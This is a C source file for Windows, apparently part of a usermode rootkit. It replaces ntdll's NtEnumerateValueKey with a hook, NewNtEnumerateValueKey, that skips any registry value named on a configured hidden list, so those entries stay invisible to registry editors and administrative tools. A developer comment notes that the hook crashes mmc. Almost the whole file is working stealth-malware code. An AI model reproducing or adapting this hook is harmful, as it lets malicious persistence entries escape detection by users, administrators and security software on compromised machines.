#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "ntenumeratevaluekey.h"

/* Return the name of the specified registrykeyvalue entry. */

PVOID getKeyValueEntryName(PVOID KeyValueInformation,KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass)
{
	PVOID pvResult=NULL;

	switch(KeyValueInformationClass)
	{
		case KeyValueBasicInformation:
			pvResult=(PVOID)&((PKEY_VALUE_BASIC_INFORMATION)KeyValueInformation)->Name;
			break;
		case KeyValueFullInformation:
			pvResult=(PVOID)&((PKEY_VALUE_FULL_INFORMATION)KeyValueInformation)->Name;
			break;
	}

	return pvResult;
}

/* Return the length of the name of the specified registrykeyvalue entry. */
	
ULONG getKeyValueEntryNameLength(PVOID KeyValueInformation,KEY_INFORMATION_CLASS KeyValueInformationClass)
{
	ULONG ulResult=0;

	switch(KeyValueInformationClass)
	{
		case KeyValueBasicInformation:
			ulResult=((PKEY_VALUE_BASIC_INFORMATION)KeyValueInformation)->NameLength;
			break;
		case KeyValueFullInformation:
			ulResult=((PKEY_VALUE_FULL_INFORMATION)KeyValueInformation)->NameLength;
			break;
	}

	return ulResult;
}

// ntdll.NtEnumerateValueKey !! somethings wrong here what makes mmc crash with admin tools !!
NTSTATUS WINAPI NewNtEnumerateValueKey(
  HANDLE KeyHandle,
  ULONG Index,
  KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  PVOID KeyValueInformation,
  ULONG Length,
  PULONG ResultLength
)
{
	NTSTATUS rc;
	ULONG tmpIndex=Index;
	
	if (KeyValueInformationClass==KeyValueBasicInformation ||
		KeyValueInformationClass==KeyValueFullInformation)
	{
		UNICODE_STRING dbg;
		ANSI_STRING asKey;
		ULONG i;
		BOOL bFound=FALSE;

		for (i=0;i<=tmpIndex;i++)
		{ 				
			rc=OldNtEnumerateValueKey(
				KeyHandle,
				i,
				KeyValueInformationClass,
				KeyValueInformation,
				Length,
				ResultLength
				);
			
			if (!NT_SUCCESS(rc))
				break;
			
			dbg.Buffer=getKeyValueEntryName(KeyValueInformation,KeyValueInformationClass);
			dbg.Length=(USHORT)getKeyValueEntryNameLength(KeyValueInformation,KeyValueInformationClass);
			RtlUnicodeStringToAnsiString(&asKey,&dbg,TRUE);	
			bFound=config_CheckString(ConfigHiddenRegKeyValue,asKey.Buffer,asKey.Length);
			if (bFound) 
				tmpIndex++;
			RtlFreeAnsiString(&asKey);
		}
	}

	// call original function
	rc=OldNtEnumerateValueKey(
			KeyHandle,
			tmpIndex,
			KeyValueInformationClass,
			KeyValueInformation,
			Length,
			ResultLength
			);

	return rc;
}
